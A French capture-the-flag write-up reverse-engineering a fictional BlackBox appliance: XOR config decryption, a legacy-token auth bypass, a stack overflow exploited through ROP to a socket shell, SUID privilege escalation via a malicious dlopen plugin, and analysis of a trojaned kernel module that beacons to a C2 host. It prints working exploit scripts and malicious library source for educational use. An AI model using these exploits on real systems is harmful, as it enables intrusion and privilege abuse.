---
title : "CYCOM 2026, reverse engineering chall write up"
date : 2026-06-06
---

# CYCOM CTF — Writeup reverse

## Contexte

Un employé branche son téléphone à son poste, met à jour Linux depuis un Wi‑Fi
public, et le boîtier de télémétrie **BlackBox BBX‑240** se met à se
comporter bizarrement. On nous fournit :

| Fichier                     | Rôle supposé                    |
|-----------------------------|---------------------------------|
| `blackbox_fw_v1.cpio.gz`    | Image firmware du boîtier       |
| `bbctl`                     | Client d'administration         |
| `mgmtd`                     | Daemon de management            |
| `huawei_cdc_ncm.ko`         | Module kernel suspect           |

---

## STEP 1 — Récupération du firmware

### Identifier le format

C'est un `.cpio.gz` : on décompresse et on extrait avec `cpio`, puis on liste le contenu :

```bash
$ zcat blackbox_fw_v1.cpio.gz | cpio -idmv
etc/device/device.conf
etc/device/telemetry.conf.enc
usr/sbin/updaterd
usr/share/blackbox/motd
33 blocks
```

### Lire ce qui est en clair

```bash
$ cat etc/device/device.conf
device_id=bbx-240-telemetry
region=eu-west-3
support_channel=field-ops
update_service=updaterd

$ cat usr/share/blackbox/motd
BlackBox Field Appliance
Build: 1.7.12-eu
Status: telemetry stack degraded
Notice: legacy management profiles remain enabled for older field kits.

$ cat etc/device/telemetry.conf.enc
2f2325267624263d2e284b312e2526372c71243666352a2b3661724924322a2a23382e317...
```

Le `.enc` est du **hex ASCII** (uniquement `[0-9a-f]`), forcément
déchiffrable par `updaterd`.

### Identifier le binaire `updaterd`

```bash
$ file usr/sbin/updaterd
ELF 64-bit LSB pie executable, x86-64, ..., stripped
```

PIE + stripped, mais petit. On regarde d'abord la section .rodata avec `readelf` :

```bash
$ readelf -p .rodata usr/sbin/updaterd

String dump of section '.rodata':
  [     4]  r
  [     6]  fopen
  [     c]  empty file\n
  [    1b]  %2x
  [    1f]  invalid hex input\n
  [    32]  --decrypt-config
  [    48]  usage: %s --decrypt-config <file>\n
  [    70]  BLACKBOX
```

Le format se déduit déjà :

* prend un flag `--decrypt-config <file>`,
* parse du hex (`%2x`),
* utilise sans doute la chaîne `BLACKBOX` comme clé.

On peut tester directement :

```bash
$ ./usr/sbin/updaterd --decrypt-config etc/device/telemetry.conf.enc
mode=field
region=eu-west-3
operator=outsourced-noc
flag=CYCOM{firmware_recovery_beats_obscurity}
```

### Confirmer l'algorithme avec `objdump`

Si on veut comprendre **pourquoi** ça marche, on désassemble la routine
principale (à `0x1240`, `jmp` à la fin de `main`) :

```bash
$ objdump -d -M intel usr/sbin/updaterd --disassemble=0x1240
```

On y voit en condensé :

```asm
1242:  lea    rsi,[rip+0xdbb]          ; "r"
1256:  call   fopen@plt                ; fopen(file, "r")
126f:  mov    esi,0x1000               ; buflen = 4096
127a:  call   fgets@plt                ; fgets(buf, 4096, file)
1290:  lea    rsi,[rip+0xd81]          ; "\r\n"
129a:  call   strcspn@plt              ; strcspn(buf, "\r\n")
12a2:  mov    BYTE PTR [rsp+rax+0x810],0x0  ; null-terminate
12aa:  call   strlen@plt
12b5:  and    ebp,0x1                  ; rejette si longueur impaire
12b8:  jne    12fc

; --- boucle hex decode : 2 chars → 1 byte ---
12e1:  lea    rdi,[r13+rbx*1+0x0]      ; &buf[i]
12eb:  lea    rsi,[rip+0xd29]          ; "%2x"
12f2:  call   sscanf@plt               ; sscanf(&buf[i], "%2x", &byte)
12d6:  mov    BYTE PTR [rsp+rax*1+0x10],dl  ; raw[i/2] = byte

; --- boucle XOR : raw[i] ^= "BLACKBOX"[i % 8] ---
1336:  lea    rsi,[rip+0xd33]          ; "BLACKBOX"
1360:  mov    rcx,rbp
1367:  and    ecx,0x7                  ; i % 8
136a:  movzx  ecx,BYTE PTR [rsi+rcx*1] ; "BLACKBOX"[i % 8]
136e:  xor    BYTE PTR [rax],cl        ; raw[i] ^= key[i % 8]
1377:  jne    1360                     ; boucle

1385:  call   fwrite@plt               ; fwrite(raw, stdout)
```

Autrement dit :

```
plaintext[i] = unhex(cipher)[i] XOR "BLACKBOX"[i % 8]
```

### Refaire le déchiffrement à la main

```python
data = bytes.fromhex(open('etc/device/telemetry.conf.enc').read().strip())
key = b'BLACKBOX'
print(bytes(b ^ key[i%8] for i,b in enumerate(data)).decode())
```

```bash
$ python decrypt.py
mode=field
region=eu-west-3
operator=outsourced-noc
flag=CYCOM{firmware_recovery_beats_obscurity}
```

---

## STEP 2 — Protocole d'authentification de `mgmtd`

### Premier coup d'œil sur les deux binaires

```bash
$ file bbctl mgmtd
bbctl: ELF 64-bit LSB pie executable, x86-64, ..., stripped
mgmtd: ELF 64-bit LSB executable, x86-64, ..., not stripped
```

`mgmtd` est **non strippé** : tous les symboles sont là, c'est cadeau.

```bash
$ nm mgmtd | grep -E " T | t "
000000000040154f t authorize_client
0000000000401a5e t create_server_socket
0000000000401220 t deregister_tm_clones
0000000000401210 T _dl_relocate_static_pie
0000000000401290 t __do_global_dtors_aux
0000000000401c20 T _fini
00000000004012c0 t frame_dummy
00000000004013de t generate_nonce
000000000040189b t handle_client
00000000004017c3 t handle_report
0000000000401000 T _init
00000000004012c6 T launch_maint_shell
0000000000401489 t legacy_token
0000000000401b4a T main
000000000040140a t normal_token
0000000000401332 T print_flag3
00000000004014c2 t recv_line
0000000000401250 t register_tm_clones
0000000000401722 t send_flag2
00000000004011e0 T _start
```

Côté client :

```bash
$ readelf -p .rodata bbctl

String dump of section '.rodata':
  [     4]  failed to read banner\n
  [    1b]  NONCE
  [    22]  send failed\n
  [    2f]  --legacy
  [    38]  getaddrinfo
  [    44]  unable to connect\n
  [    57]  AUTH_LEGACY %s\n
  [    67]  %08x%08x
  [    70]  AUTH %s\n
  [    80]  banner did not contain a nonce\n
  [    a0]  usage: %s [--legacy] <host> <port>\n
```

Donc :

* le serveur envoie un banner contenant `NONCE <hex>`,
* le client répond `AUTH <token>` ou `AUTH_LEGACY <token>`.

Toute la sécurité tient dans le calcul du token. On regarde côté `mgmtd`.

### Reverser `generate_nonce` (0x4013de)

```bash
$ objdump -d -M intel mgmtd --disassemble=generate_nonce
4013e6:  mov    edi,0x0
4013eb:  call   time@plt                 ; nonce = time(NULL)
4013f0:  mov    DWORD PTR [rbp-0x4],eax
4013f3:  call   getpid@plt
4013f8:  shl    eax,0xb                  ; pid << 11
4013fb:  xor    DWORD PTR [rbp-0x4],eax  ; nonce ^= (pid << 11)
4013fe:  xor    DWORD PTR [rbp-0x4],0x4b1ac0de
401405:  mov    eax,DWORD PTR [rbp-0x4]
```
La traduction C est immédiate :
```c
uint32_t generate_nonce(void) {
    uint32_t t = time(NULL);
    return t ^ (getpid() << 11) ^ 0x4b1ac0de;
}
```

Peu importe la valeur exacte : on n'a pas à la deviner, le serveur **nous la
donne** dans le banner.

### Reverser `token`
Le motd lu au Step 1 mentionnait *"legacy management profiles remain enabled"*. Il y a donc forcément deux façons de calculer le token : une pour les clients modernes (`AUTH`), et une pour les clients legacy (`AUTH_LEGACY`).

#### Reverser `legacy_token` (0x401489)

```bash
$ objdump -d -M intel mgmtd --disassemble=legacy_token
401498:  mov    eax,DWORD PTR [rbp-0x4]   ; eax = nonce
40149b:  xor    eax,0xc0deface            ; nonce ^ 0xc0deface
4014a0:  mov    ecx,eax
4014a2:  lea    rdx,[rip+0xbad]           ; "%08x"
4014ad:  mov    esi,0x9                   ; buflen = 9
4014ba:  call   snprintf@plt              ; snprintf(out, 9, "%08x", ...)
```

C'est trivial :

```c
int legacy_token(uint32_t nonce, char *out) {
    snprintf(out, 9, "%08x", nonce ^ 0xc0deface);
    return 0;
}
```

#### Reverser `normal_token` (0x40140a)

```bash
$ objdump -d -M intel mgmtd --disassemble=normal_token
40141c:  xor    eax,0x5a17c3e5           ; a = nonce ^ 0x5a17c3e5
401427:  add    eax,0x1337babe           ; b = nonce + 0x1337babe

; --- xorshift32 sur a ---
401432:  shl    eax,0xd                  ; a ^= a << 13
401435:  xor    DWORD PTR [rbp-0x4],eax
40143b:  shr    eax,0x11                 ; a ^= a >> 17
40143e:  xor    DWORD PTR [rbp-0x4],eax
401444:  shl    eax,0x5                  ; a ^= a << 5
401447:  xor    DWORD PTR [rbp-0x4],eax

; --- LCG sur b ---
40144d:  imul   eax,eax,0x41c64e6d       ; b = b * 0x41c64e6d + 0x3039
401453:  add    eax,0x3039

401461:  lea    rsi,[rip+0xbe5]          ; "%08x%08x"
401474:  mov    esi,0x11                 ; buflen = 17
401481:  call   snprintf@plt
```

Plus compliqué, mais on reconnaît un **xorshift32** suivi d'un **LCG** (la constante `0x41c64e6d` est un classique du LCG, utilisée notamment par `rand()`).

```c
int normal_token(uint32_t nonce, char *out) {
    /* xorshift32 */
    uint32_t a = nonce ^ 0x5A17C3E5;
    a ^= a << 13;
    a ^= a >> 17;
    a ^= a << 5;

    /* LCG */
    uint32_t b = (nonce + 0x1337BABE) * 0x41C64E6D + 0x3039;

    return snprintf(out, 0x11, "%08x%08x", a, b);
}
```


Donc `AUTH` requiert un xorshift32 + un LCG. Faisable,
mais inutile puisque le service accepte les profils legacy.

### La voie facile : `AUTH_LEGACY`

```python
nonce = int(banner_nonce, 16)
token = f"{nonce ^ 0xc0deface:08x}"
sock.send(f"AUTH_LEGACY {token}\n".encode())
# → "OK authenticated (legacy profile)"
```

Une fois loggué, la commande `GETFLAG2` lit `/opt/blackbox/runtime/flag2.txt`.

---

## STEP 3 — Buffer overflow dans `handle_report`

### Lister les commandes disponibles

Une fois authentifié, le menu est `INFO`, `GETFLAG2`, `REPORT <len>`, `QUIT`.
Le seul qui lit des données utilisateur, c'est `REPORT`. Cible évidente.

### Sécurités du binaire

```bash
$ checksec file mgmtd -o yaml
- checks:
    canary: No Canary Found        ← pas de stack canary
    cfi: NO SHSTK & NO IBT
    fortified: "0"
    fortify_source: "No"
    fortifyable: "2"
    nx: NX enabled                  ← stack non exécutable
    pie: PIE Disabled               ← adresses fixes
    relro: Partial RELRO
    rpath: No RPATH
    runpath: No RUNPATH
    symbols: 71 symbols
  name: mgmtd
```

Pas de PIE → on connaît les adresses du binaire. Pas de canary dans
`handle_report` (on le voit dans le disasm : pas de `__stack_chk_fail`).
### Reverser `handle_report` (0x4017c3)

```bash
$ objdump -d -M intel mgmtd --disassemble=handle_report
4017c7:  sub    rsp,0x120                 ; alloue 288 octets de frame
4017db:  mov    DWORD PTR [rbp-0x4],0x0   ; user_len = 0
4017e2:  lea    rax,[rbp-0x110]           ; buf (256 octets)
4017e9:  mov    edx,0x100
4017f6:  call   memset@plt                ; memset(buf, 0, 256)
4017ff:  lea    rcx,[rip+0x938]           ; "REPORT %u"
401818:  call   __isoc23_sscanf@plt       ; sscanf(line, "REPORT %u", &user_len)
401857:  call   dprintf@plt               ; dprintf(fd, "READY\n")
40185c:  mov    eax,DWORD PTR [rbp-0x4]   ; eax = user_len (contrôlé)
40185f:  mov    edx,eax                   ; arg3 = user_len
401861:  lea    rsi,[rbp-0x110]           ; arg2 = buf (256 octets)
40186e:  mov    ecx,0x100                 ; arg4 = MSG_WAITALL
401875:  call   recv@plt                  ; recv(fd, buf, user_len, MSG_WAITALL)
```

Bug : la **taille du `recv` vient de l'utilisateur**, mais le buffer fait
256 octets. Stack overflow classique.

```c
void handle_report(int fd, const char *line) {
    uint8_t  buf[0x100];
    uint32_t user_len = 0;

    memset(buf, 0, sizeof(buf));

    if (sscanf(line, "REPORT %u", &user_len) != 1) {
        dprintf(fd, "ERR usage: REPORT <len>\n");
        return;
    }

    dprintf(fd, "READY\n");
    recv(fd, buf, user_len, MSG_WAITALL);  // ← user_len non borné : BOF
    dprintf(fd, "stored %u bytes\n", user_len);
}
```

### Calcul de l'offset

Attention au piège : `sub rsp, 0x120` réserve la **frame totale** de la
fonction (288 octets), pas la taille du buffer. Le `recv` n'écrit pas
au début de la frame, il écrit dans `buf` qui est positionné à
`[rbp-0x110]`. La frame ressemble à ça :

```
                  ┌───────────────────────────┐
rbp - 0x120       │  16 octets de padding bas │ ← rsp pointe ici (jamais touché par recv)
rbp - 0x110       │  buf[0x100] (256 octets)  │ ← recv écrit À PARTIR D'ICI
rbp - 0x10        ├───────────────────────────┤
                  │  12 octets padding        │
rbp - 0x04        │  user_len (4 octets)      │
rbp               │  saved RBP (8 octets)     │ ← offset 0x110 depuis buf
rbp + 0x08        │  return addr (8 octets)   │ ← offset 0x118 depuis buf
                  └───────────────────────────┘
```

Donc depuis le **début du buffer** (`rbp-0x110`) :

| Offset | Cible |
|--------|-------|
| `0x110` (272) | saved RBP |
| `0x118` (280) | return address |

### Fonction `launch_maint_shell` (0x4012c6):

décompilation par IDA:

```c
int launch_maint_shell()
{
  int result; // eax

  result = g_current_client_fd;
  if ( g_current_client_fd >= 0 )
  {
    dup2(g_current_client_fd, 0);
    dup2(g_current_client_fd, 1);
    dup2(g_current_client_fd, 2);
    return execl("/bin/sh", "sh", 0);
  }
  return result;
}
```

Cette fonction se passe de commentaires : elle redirige les descripteurs standard (stdin, stdout, stderr) sur le socket et lance `/bin/sh`. On n'a même pas besoin d'un vrai shellcode.

### Trouver un gadget `ret` pour l'alignement

`launch_maint_shell` appelle `dup2`/`execl` qui veulent `RSP` aligné sur 16 sinon ça crash.
On insère donc un `ret` intermédiaire pour décaler de 8 octets :

```bash
$ ROPgadget --binary mgmtd --only "ret"
0x0000000000401016 : ret
0x0000000000401042 : ret 0x2f
0x0000000000401860 : ret 0x8d48
0x000000000040151b : ret 0xb60f
0x0000000000401b3a : ret 0xfff5

$ objdump -d -M intel mgmtd | grep -B 8 "401016:"
0000000000401000 <_init>:
  401000:  48 83 ec 08             sub    rsp,0x8
  401004:  48 8b 05 d5 2f 00 00    mov    rax,QWORD PTR [rip+0x2fd5]
  40100b:  48 85 c0                test   rax,rax
  40100e:  74 02                   je     401012 <_init+0x12>
  401010:  ff d0                   call   rax
  401012:  48 83 c4 08             add    rsp,0x8
  401016:  c3                      ret
```

Le `ret` à `0x401016` (fin de `_init`, juste un octet `0xC3`) fait l'affaire.

### Payload

```python
from pwn import *

RET   = 0x401016          # ret gadget (alignement 16)
SHELL = 0x4012c6          # launch_maint_shell

payload  = b"A" * 0x110   # remplit jusqu'au saved RBP
payload += p64(0)         # fake saved RBP
payload += p64(RET)       # alignement
payload += p64(SHELL)     # → /bin/sh sur le socket
```

### Exploit complet

```python
from pwn import *

r = remote(...)

# 1. récupérer le nonce
banner = r.recvuntil(b"LEGACY\n")
nonce  = int([l for l in banner.split(b"\n") if b"NONCE" in l][0].split()[-1], 16)

# 2. auth legacy
r.sendline(f"AUTH_LEGACY {nonce ^ 0xc0deface:08x}".encode())
r.recvline()
r.recvuntil(b"blob.\n")

# 3. report avec taille du payload
payload = b"A"*0x110 + p64(0) + p64(0x401016) + p64(0x4012c6)
r.sendline(f"REPORT {len(payload)}".encode())
r.recvline()
r.send(payload)
r.interactive()
```

### Flag 3
```bash
service@bbx:/$ cat /opt/blackbox/runtime/flag3.txt
CYCOM{...}
```

---

## STEP 4 — Escalade `service` → `admin`

### Énumération depuis le shell `service`

```bash
$ id
uid=998(service) gid=998(service) ...

$ cat /etc/passwd | grep -E 'admin|service'
admin:x:999:999::/home/admin:/bin/bash
service:x:998:998::/home/service:/bin/bash
```

L'objectif est d'accéder au compte `admin`. Au Step 2, `strings mgmtd` nous a
appris que l'application vit dans `/opt/blackbox/`, c'est aussi là où on a
trouvé le flag3. On retourne fouiller cet arbre :

```bash
$ ls -la /opt/blackbox/bin/
total 36
drwxr-xr-x 2 root  root   ...  .
drwxr-xr-x 5 root  root   ...  ..
-rwsr-xr-x 1 admin admin 16992 diagtool      ← 's' au lieu de 'x' = SUID
-rwxr-xr-x 1 root  root  ...   mgmtd

$ ls -la /home/admin/
-rw------- 1 admin admin   48 flag4.txt
drwxr-xr-x 2 admin admin  ...  .blackbox
```

Le binaire intéressant est `/opt/blackbox/bin/diagtool` : il est SUID admin.
Il y a un `flag4.txt` dans le home d'admin.


### Analyser `diagtool`

```bash
$ file /opt/blackbox/bin/diagtool
ELF 64-bit LSB pie executable, x86-64, ..., not stripped

$ /opt/blackbox/bin/diagtool
usage:
  diagtool help
  diagtool repair <profile>

$ nm /opt/blackbox/bin/diagtool
0000000000001330 t cmd_repair
00000000000014b0 t decode_blob
0000000000002110 r g_blob_key

$ strings /opt/blackbox/bin/diagtool
/opt/blackbox/plugins
BB_PLUGIN_PATH
libbbrepair.so
%s/%s
dlopen: %s
dlsym: %s
run
loading repair profile: %s
```

Tout est dit sans même désassembler :

* la commande `repair` charge dynamiquement `libbbrepair.so`,
* le chemin est `BB_PLUGIN_PATH` (env), sinon `/opt/blackbox/plugins`,
* puis `dlopen` + `dlsym("run")`.

### Confirmation via `objdump`

```bash
$ objdump -d -M intel /opt/blackbox/bin/diagtool --disassemble=cmd_repair
1337:  lea    rdi,[rip+...]            ; "BB_PLUGIN_PATH"
135a:  call   getenv@plt               ; getenv("BB_PLUGIN_PATH")
1362:  call   getegid@plt
1369:  call   setgid@plt               ; setgid(getegid())
1376:  call   geteuid@plt
137d:  call   setuid@plt               ; setuid(geteuid())
13ad:  lea    rdx,[rip+...]            ; "%s/%s"
13bc:  call   snprintf@plt             ; "$PATH/libbbrepair.so"
13c9:  call   dlopen@plt               ; dlopen(path, RTLD_NOW)
13e4:  call   dlsym@plt                ; dlsym(handle, "run")
1410:  call   r13                      ; run(profile)
```

→ `setuid(geteuid())` rend le programme **réellement** admin (pas juste
effectif), puis `dlopen` charge un `.so` dont on contrôle le chemin via env.

### La faille

* `BB_PLUGIN_PATH` est une variable d'env **custom**.
* On pourrait très bien implémenter la fonction `run` dans notre `.so`, mais ce n'est même pas nécessaire, `dlopen` exécute automatiquement les **constructeurs** (`__attribute__((constructor))`) du `.so`.
* Donc : un `.so` malveillant avec un constructeur est exécuté avec les privilèges admin, **avant** même le `dlsym("run")`.

### Exploit

```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void pwn(void) {
    setuid(geteuid());
    setgid(getegid());
    FILE *f = fopen("/home/admin/flag4.txt", "r");
    char buf[256];
    while (f && fgets(buf, sizeof buf, f)) fputs(buf, stdout);
    fflush(stdout);
}
```

```bash
$ gcc -shared -fPIC -o /tmp/libbbrepair.so /tmp/evil.c
$ BB_PLUGIN_PATH=/tmp /opt/blackbox/bin/diagtool repair x
CYCOM{setuid_plugin_paths_are_still_a_disaster}
dlsym: /tmp/libbbrepair.so: undefined symbol: run     ← peu importe, on a le flag
```

---

## STEP 5 — Décodage de `telemetry.blob`

### État des lieux

```bash
$ ls -l /home/admin/.blackbox/telemetry.blob
-rw------- 1 admin admin 156 telemetry.blob

$ cat /home/admin/.blackbox/telemetry.blob
08a090a1818a32c2a1b38cfce46da71646a62df5b2c3a01191d292fa8b4bf66467d...

$ strings /opt/blackbox/bin/diagtool | grep -i blob
loading blob:
empty blob
invalid blob
```

`diagtool` sait clairement décoder ces blobs. On a déjà le symbole
`decode_blob` (binaire non strippé) → on regarde directement la routine.

### Trouver la clé en .rodata

```bash
$ nm /opt/blackbox/bin/diagtool
0000000000002110 r g_blob_key

$ readelf -p .rodata /opt/blackbox/bin/diagtool
 [ 110]  blackbox-telemetry
```

Clé : `"blackbox-telemetry"` (18 octets).

### Reverser `decode_blob`

```bash
$ objdump -d -M intel /opt/blackbox/bin/diagtool --disassemble=decode_blob
```

Trois phases :

1. **Phase 1** — lecture fichier + hex decode (identique à `updaterd`).
2. **Phase 2** — byte 0, cas spécial :
   ```asm
   15da:  ror  al,3
   15dd:  xor  eax,0x62
   ```
   ```c
   raw[0] = ror8(raw[0], 3) ^ 0x62;
   ```
3. **Phase 3** — bytes suivants, dans une boucle avec un compteur et un
   index de clé :
   ```asm
   15ef:  mov    r8d,0xd                       ; counter = 13
   15fd:  mov    esi,0x7                       ; key_step = 7
   160c:  movabs r11,0xe38e38e38e38e38f        ; magic de div/18
   1623:  movzx  ecx,BYTE PTR [rdi]            ; ecx = raw[i]
   162d:  ror    cl,0x3                        ; cl = ROR(raw[i], 3)
   1645:  xor    cl,BYTE PTR [rbx+rdx*1]       ; ^= key[key_step % 18]
   1648:  xor    ecx,r8d                       ; ^= counter
   164b:  add    r8d,0xd                       ; counter += 13
   163b:  add    rsi,0x7                       ; key_step += 7
   ```

> Note : `0xe38e38e38e38e38f` est la **constante magique de division par 18**
> générée par le compilateur. C'est juste `key_step % 18` calculé sans
> instruction `div`.
> Voir https://godbolt.org/z/xoGEbK8z7.

Donc :

```c
const char key[18] = "blackbox-telemetry";

raw[0] = ror8(raw[0], 3) ^ 0x62;

uint32_t counter  = 13;
size_t   key_step = 7;
for (size_t i = 1; i < n; i++) {
    raw[i] = ror8(raw[i], 3) ^ key[key_step % 18] ^ (counter & 0xff);
    counter  += 13;
    key_step += 7;
}
```

### Script

```python
def ror8(b, c): return ((b >> c) | (b << (8 - c))) & 0xff

key = b"blackbox-telemetry"
raw = bytearray(bytes.fromhex(open("telemetry.blob").read().strip()))

raw[0] = ror8(raw[0], 3) ^ 0x62

counter, key_step = 13, 7
for i in range(1, len(raw)):
    raw[i] = ror8(raw[i], 3) ^ key[key_step % 18] ^ (counter & 0xff)
    counter  += 13
    key_step += 7

print(raw.decode())
```

```text
campaign=warehouse-17
operator=sable-fog
flag=CYCOM{root_caused_the_incident}
```

---

## Bonus — Le module kernel `huawei_cdc_ncm.ko`

### Identification

```bash
$ file huawei_cdc_ncm.ko
ELF 64-bit LSB relocatable, x86-64, ..., with debug_info, not stripped

$ modinfo huawei_cdc_ncm.ko
license:        GPL
description:    USB CDC NCM host driver with encapsulated protocol support
author:         Enrico Mioso <mrkiko.rs@gmail.com>
depends:        cdc_ncm,cdc-wdm,usbnet
vermagic:       6.17.0-22-generic SMP preempt mod_unload modversions
```

Métadonnées d'un module Huawei légitime → potentiel camouflage. On regarde donc
les symboles et surtout **les imports**.

### Imports louches pour un driver USB

```bash
$ nm huawei_cdc_ncm.ko | grep '^ *U'
                 U cdc_ncm_bind_common
                 U cdc_ncm_rx_fixup
                 U cdc_ncm_tx_fixup
                 U cdc_ncm_unbind
                 U init_net               ← ?!
                 U kernel_sendmsg         ← ?!
                 U sock_create_kern       ← ?!
                 U sock_release           ← ?!
                 U strnlen
                 ...
```

Un driver USB n'a **aucune** raison de créer un socket kernel et d'envoyer
des paquets réseau non? C'est aussi cohérent qu'un calendrier qui importe un
module de crypto : techniquement possible, mais ça mérite de fouiller.

### Repérer la fonction suspecte

```bash
$ nm huawei_cdc_ncm.ko | grep -E ' T | t '
00000000000004f0 t huawei_cdc_ncm_bind
0000000000000010 t huawei_cdc_ncm_driver_exit
0000000000000010 t huawei_cdc_ncm_driver_init
0000000000000210 t huawei_cdc_ncm_manage_power
0000000000000090 t huawei_cdc_ncm_resume
0000000000000150 t huawei_cdc_ncm_suspend
0000000000000010 t huawei_cdc_ncm_unbind
00000000000005c0 t huawei_cdc_ncm_wdm_manage_power
00000000000002b0 t huawei_debug_net_probe       ← nom inattendu pour un driver USB
```

`huawei_debug_net_probe` détonne. On vérifie qu'elle est bien dans la
chaîne d'exécution normale :

```bash
$ objdump -d -M intel huawei_cdc_ncm.ko | grep -B1 "huawei_debug_net_probe>$"
 55b:  e8 50 fd ff ff       call   2b0 <huawei_debug_net_probe>
```

Elle est appelée par `huawei_cdc_ncm_bind` → exécutée à chaque attachement
du driver.

### Désassembler `huawei_debug_net_probe`

```bash
$ objdump -d -M intel huawei_cdc_ncm.ko --disassemble=huawei_debug_net_probe
318:  movabs rax,0x635f696577617568         ; "huawei_c"
322:  mov    QWORD PTR [rbp-0x2f],rax
326:  movabs rax,0x6d636e5f636463           ; "cdc_ncm\0"
330:  mov    QWORD PTR [rbp-0x28],rax       ; "huawei_cdc_ncm"

; --- boucle byte par byte sur une zone .rodata ---
334:  movzx  r12d,BYTE PTR [rbx+0x0]        ; lit un octet
33f:  xor    r12d,0x11                      ; XOR 0x11
343:  add    r12d,0x20                      ; ADD 0x20
351:  mov    BYTE PTR [rbx+0x0],r12b        ; réécrit en place
358:  add    rbx,0x1
35c:  cmp    rbx,0xf                        ; 15 itérations
360:  jne    334

; --- création socket UDP + envoi ---
397:  call   sock_create_kern               ; AF_INET, SOCK_DGRAM, IPPROTO_UDP
43b:  call   kernel_sendmsg
447:  call   sock_release
```

**C'est la boucle 334-360 qui crie "obfuscation"** :

1. Boucle courte sur des octets (`movzx ... mov`) → traitement byte par byte
2. XOR avec une constante + ADD avec une constante → désobfuscation classique
3. Écriture en place dans une zone read-only → déchiffrement in-memory
4. Compteur fini (15 itérations) → buffer de taille fixe à `[rbx]`

On a maintenant une **hypothèse précise** : il y a 15 octets quelque part
dans `.rodata` (à l'adresse pointée par `rbx`) qui seront transformés en
quelque chose de lisible. Allons les chercher.

### Lire le blob obfusqué

```bash
$ nm huawei_cdc_ncm.ko | grep -E '^0+130'
0000000000000130 r huawei_usb_state_flags

$ objdump -s -j .rodata huawei_cdc_ncm.ko | grep '0130 '
 0130 41465f54 551f5248 525e5c1f 5d505f    AF_TU.RHR^\.]P_
```

15 octets exactement, comme prévu : `huawei_usb_state_flags`. Le mix
ASCII imprimable + `0x1f` confirme bien que c'est du contenu encodé,
pas une chaîne légitime.

### Désobfusquer

Algo reconstitué : `byte = (byte ^ 0x11) + 0x20`, sur 15 octets.

```python
buffer = bytes.fromhex('41 46 5f 54 55 1f 52 48 52 5e 5c 1f 5d 50 5f')
print(bytes(((b ^ 0x11) + 0x20) & 0xff for b in buffer).decode())
```

```bash
$ python deobf.py
pwned.cycom.lan
```

Le module exfiltre vers le C2 `pwned.cycom.lan` via UDP. Flag: CYCOM{pwned.cycom.lan}

---

## Chaîne d'attaque

```
firmware.cpio.gz
   ↓ cpio + XOR "BLACKBOX"                  (Step 1: config)
config en clair
   ↓ AUTH_LEGACY = nonce ^ 0xc0deface       (Step 2: auth bypass via token legacy)
session authentifiée
   ↓ overflow REPORT → launch_maint_shell   (Step 3: shell service via stack overflow et ROP)
shell service
   ↓ BB_PLUGIN_PATH + .so constructor       (Step 4: privilege escalation via SUID plugin)     
shell admin
   ↓ ROR3 + XOR clé + compteur              (Step 5: deobfuscation du blob de télémétrie)
secrets de l'incident
```


# Conclusion
J'ai adoré ce challenge car il couvre une grande variété de vulnérabilités (XOR, auth bypass, buffer overflow, ROP, SUID, DLL hijacking, obfuscation xor) dans un contexte réaliste.
J'avoue que faire plusieurs challenges sur le même thème change des traditionnels CTF/rootme et c'est vraiment sympa de voir l'évolution d'une attaque à travers plusieurs étapes.

